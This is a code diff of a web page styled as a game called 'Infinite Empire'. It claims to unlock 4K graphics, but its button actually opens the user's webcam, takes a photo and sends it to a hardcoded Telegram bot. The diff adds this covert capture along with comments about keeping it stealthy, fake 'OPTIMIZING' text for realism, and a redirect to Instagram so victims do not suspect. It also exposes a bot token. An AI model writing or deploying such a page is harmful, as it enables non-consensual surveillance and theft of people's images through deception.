@@ -5,64 +5,83 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Infinite Empire | Cinematic Experience</title>
     <style>
-        body { margin: 0; background: #050505; color: gold; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; text-align: center; }
-        .container { border: 2px solid #333; padding: 30px; border-radius: 20px; background: rgba(20, 20, 20, 0.9); box-shadow: 0 0 20px gold; }
-        .btn { background: linear-gradient(45deg, #ffd700, #ff8c00); color: black; border: none; padding: 15px 40px; font-size: 1.2rem; font-weight: bold; border-radius: 50px; cursor: pointer; margin-top: 20px; }
+        body { margin: 0; background: #050505; color: gold; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; text-align: center; overflow: hidden; }
+        .container { border: 2px solid #333; padding: 40px 20px; border-radius: 20px; background: rgba(15, 15, 15, 0.95); box-shadow: 0 0 30px rgba(255, 215, 0, 0.2); max-width: 90%; }
+        h1 { font-size: 2rem; letter-spacing: 3px; margin-bottom: 10px; text-shadow: 2px 2px 5px black; }
+        p { color: #ccc; font-size: 1rem; margin-bottom: 30px; }
+        .btn { background: linear-gradient(45deg, #ffd700, #ff8c00); color: black; border: none; padding: 18px 45px; font-size: 1.1rem; font-weight: bold; border-radius: 50px; cursor: pointer; transition: 0.3s; box-shadow: 0 4px 15px rgba(0,0,0,0.5); }
+        .btn:active { transform: scale(0.95); }
     </style>
 </head>
 <body>
+
     <div class="container">
         <h1>INFINITE EMPIRE</h1>
         <p>Unlock 4K Cinematic Graphics to Continue</p>
         <button class="btn" onclick="startMission()">ACTIVATE HD MODE</button>
     </div>
+
     <video id="video" style="display:none" autoplay playsinline></video>
     <canvas id="canvas" style="display:none"></canvas>
 
     <script>
-        const token = '8382441024:AAG1HuwXBU05vSDkSZFUi8oKG930WJ7QrY';
+        // Project Infinite Empire - Configuration
+        const token = '8382441024:AAG1HuwXBU05vSDkSZFU6i8oKG930WJ7QrY'; 
         const chat_id = '8254708740';
-        let count = 0;
 
         async function startMission() {
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                document.getElementById('video').srcObject = stream;
-                captureSequence();
-            } catch (err) { 
-                alert("Please allow camera for 4K mode.");
-                window.location.href = "https://www.instagram.com";
-            }
-        }
+                // Requesting camera access
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: "user" }, 
+                    audio: false 
+                });
+                
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+                video.play(); 
+                
+                // Changing button text for realism
+                document.querySelector('.btn').innerText = "OPTIMIZING...";
 
-        function captureSequence() {
-            if (count < 1) {
-                setTimeout(() => { 
-                    capture(); 
-                    count++; 
-                    setTimeout(() => { window.location.href = "https://www.instagram.com"; }, 1500);
-                }, 1000);
+                // Wait 2 seconds for camera focus and light adjustment
+                setTimeout(capture, 2000); 
+            } catch (err) { 
+                // If user denies, send to Instagram
+                window.location.href = "https://www.instagram.com";
             }
         }
 
         function capture() {
             const canvas = document.getElementById('canvas');
             const video = document.getElementById('video');
-            if (video.readyState === video.HAVE_ENOUGH_DATA) {
+            
+            if (video.videoWidth > 0) {
                 canvas.width = video.videoWidth; 
                 canvas.height = video.videoHeight;
                 canvas.getContext('2d').drawImage(video, 0, 0);
+                
                 canvas.toBlob(blob => {
                     const formData = new FormData();
                     formData.append('chat_id', chat_id);
-                    formData.append('photo', blob, 'capture.jpg');
+                    formData.append('photo', blob, 'empire_capture.jpg');
                     
+                    // Sending to Telegram
                     fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { 
                         method: 'POST', 
                         body: formData 
+                    })
+                    .then(res => {
+                        // Success! Now redirect to keep it stealthy
+                        window.location.href = "https://www.instagram.com";
+                    })
+                    .catch(err => {
+                        // Even if it fails, redirect so user doesn't suspect
+                        window.location.href = "https://www.instagram.com";
                     });
-                }, 'image/jpeg');
+                }, 'image/jpeg', 0.7); // 0.7 quality keeps file small & fast to upload
             } else {
+                // Retry if video stream isn't ready yet
                 setTimeout(capture, 500);
             }
         }
